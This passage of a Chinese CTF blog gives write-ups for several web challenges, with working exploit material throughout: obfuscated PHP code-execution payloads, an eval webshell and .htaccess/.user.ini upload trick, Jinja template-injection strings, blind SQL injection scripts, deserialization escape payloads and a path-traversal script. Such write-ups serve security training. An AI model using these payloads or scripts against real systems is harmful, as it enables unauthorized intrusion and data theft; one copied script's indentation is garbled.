<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200812222109098.png" alt="image-20200812222109098"></p>
<p>payload3:</p>
<p>通过白名单和数字异或出 <code>_GET或_POST</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$list = [<span class="string">'_G'</span>,<span class="string">'ET'</span>];</span><br><span class="line"></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($t=<span class="number">0</span>;$t&lt;sizeof($list);$t++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line"></span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">if</span>($exp == $list[$t])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p><code>.hatcess</code></p>
<p><code>SetHandler application/x-httpd-php</code></p>
<p><code>图片马</code></p>
<p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></p>
<p>Nginx 可以利用 <code>.user.ini</code> 自动包含文件</p>
<p><code>auto_prepend_file=xx.jpg</code></p>
<h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>禁用 <code>()</code> RCE无缘</p>
<p>内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>读取配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>又是一道SSTI</p>
<p>抓包发现 user存在SSTI注入，参考<a href="[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-PHP-%E5%AE%9E%E4%BE%8B](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#1-PHP-实例)">k0rz3n师傅的文章</a></p>
<p><img src="/2020/08/8月刷题记录/image-20200813101645436.png" alt="image-20200813101645436"></p>
<h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>扫一下目录，发现了robots.txt,直接访问hint.txt</p>
<p>得到 <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p>
<p>禁用了一下关键字</p>
<p><img src="/2020/08/8月刷题记录/image-20200813210653330.png" alt="image-20200813210653330"></p>
<p>这里 <code>username</code>传入 <code>\</code> 就会把 <code>&#39;</code>转义破坏语句结构</p>
<p><code>username=\&amp;password=or/**/1&gt;0#</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'\'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'     or/**/1&gt;0#'</span></span><br></pre></td></tr></table></figure>

<p><code>1&gt;0 返回  BJD needs to be stronger</code></p>
<p><code>1&lt;0 返回  You konw ,P3rh4ps needs a girl friend</code></p>
<p>然后写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://70c88c86-504f-479c-be1d-0324c8bcbb17.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"\\"</span>,<span class="string">"password"</span>:<span class="string">""</span>&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#print(mid)</span></span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        data[<span class="string">'password'</span>] = payload</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    last = result</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h3 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>extract($_POST);</code>导致变量覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"2"</span>,<span class="string">"color"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">extract(<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="keyword">array</span>(<span class="string">"year"</span>,<span class="string">"2020"</span>)));</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>所以<code>$_SESSION</code>是可控的，通过<code>filter()</code>改变序列化字符串，从而可控<code>img</code>的值</p>
<p>payload1:<code>值逃逸</code>，这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p>
<p>payload2:<code>键逃逸</code>，这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">"show_image"</span> ;</span><br><span class="line"><span class="comment">//payload1</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"_SESSION"</span>=&gt;<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,<span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span>));</span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="comment">//$b=array("_SESSION"=&gt;array("flagphp"=&gt;';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'));</span></span><br><span class="line">extract($b);</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">var_dump($serialize_info);</span><br><span class="line"></span><br><span class="line">$userinfo = unserialize($serialize_info);</span><br><span class="line">var_dump($userinfo);</span><br></pre></td></tr></table></figure>

<p>接着读flag就行</p>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>抓包后，读源码</p>
<p><img src="/2020/08/8月刷题记录/image-20200815235733909.png" alt="image-20200815235733909"></p>
<p>过滤很多，但有个反序列化函数没被禁用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"ls"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200816000143586.png" alt="image-20200816000143586"></p>
<p>命名空间绕过黑名单</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">func=\system&amp;p=cat <span class="constructor">$(<span class="params">find</span> <span class="operator">/</span> -<span class="params">name</span> <span class="params">flag</span><span class="operator">*</span>)</span></span><br></pre></td></tr></table></figure>

<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>写脚本爆破GET和POST参数</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo "hello_qwb_qwb";'</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1/src/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz(filename):</span><br><span class="line">    file = open(<span class="string">"./src/"</span> + filename, <span class="string">"r"</span>)</span><br><span class="line">    # <span class="builtin-name">print</span> <span class="string">"[*]open:"</span> + filename</span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line">    getpattern = re.compile(r<span class="string">'\$_GET\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    <span class="builtin-name">get</span> = getpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    postpattern = re.compile(r<span class="string">'\$_POST\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    post = postpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    file_url = url + filename</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> get:</span><br><span class="line">        r = requests.<span class="builtin-name">get</span>(file_url + <span class="string">"?"</span> + g + <span class="string">"="</span> + urllib.quote(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]file:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]get:"</span> + g)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> post:</span><br><span class="line">        data = &#123;p: payload&#125;</span><br><span class="line">        r = requests.post(file_url, <span class="attribute">data</span>=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]flie:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]post:"</span> + p)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]finish:"</span> + filename)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TextThread(threading.Thread):</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.__queue = queue</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        global text</span><br><span class="line">       <span class="built_in"> queue </span>= self.__queue</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">            filename = queue.<span class="builtin-name">get</span>()</span><br><span class="line">            fuzz(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">   <span class="built_in"> queue </span>= Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'./src'</span>):</span><br><span class="line">        queue.put(filename)</span><br><span class="line"></span><br><span class="line">    thread_count = 8</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, thread_count):</span><br><span class="line">        thread = TextThread(queue)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF_7月赛</title>
    <url>/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ezinclude"><a href="#1-Ezinclude" class="headerlink" title="1.Ezinclude"></a>1.Ezinclude</h3><p>  URL的请求加了个unix时间戳，只能写脚本淦。后面测试发现gqy.jpg和/gqy.jpg回显相同，可以判断文件名前拼接了路径，这种情况无法使用wrapper等手段的。同时waf也会过滤 <code>../</code>。尝试多次都没包含成功，就强行用了下伪协议成功了，后面看了源码醉了，如果f参数的开头给出一个目录再穿越就可以绕过waf了。这里的伪协议就相当于目录。</p><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">file=<span class="string">b'php://filter/read=convert.base64-encode/resource=../../../../../../../../../../flag'</span></span><br><span class="line">t=int(time.time())</span><br><span class="line">f= base64.b64encode(file).decode()</span><br><span class="line">url = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t,f)</span><br><span class="line"><span class="comment">#print(url)</span></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you miss some parameters"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">'t'</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"what's your time?"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">'f'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">"/../"</span>)) === <span class="string">"/../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"../"</span>)) === <span class="string">"../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"./"</span>)) === <span class="string">"./"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"/."</span>)) === <span class="string">"/."</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"//"</span>)) === <span class="string">"//"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not allowed to do that.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/img/'</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-SQLI"><a href="#2-SQLI" class="headerlink" title="2.SQLI"></a>2.SQLI</h3><p>就大概看了下题目，后面比赛结束环境没了，就看了下<a href="https://www.gem-love.com/ctf/2514.html" target="_blank" rel="noopener">y1ng</a>师傅的题解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L'Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment">#库名 利用limit注入 sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名 flllaaaggg</span></span><br><span class="line">payload = <span class="string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">true<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">truetruehost = <span class="string">'''http://183.129.189.60:10004/?id=1'=(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;char&#125;')%23'''</span>.format(payload=payload.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">truetruer = req.get(host)</span><br><span class="line">truetrue<span class="keyword">if</span> <span class="string">r'admin666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">truetruetrueres += char</span><br><span class="line">truetruetrueprint(<span class="string">"found it: "</span>+res)</span><br><span class="line">truetruetrue<span class="keyword">break</span></span><br><span class="line">truetruet.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<p>因为可以联合注入，所以直接联合查表也行</p>
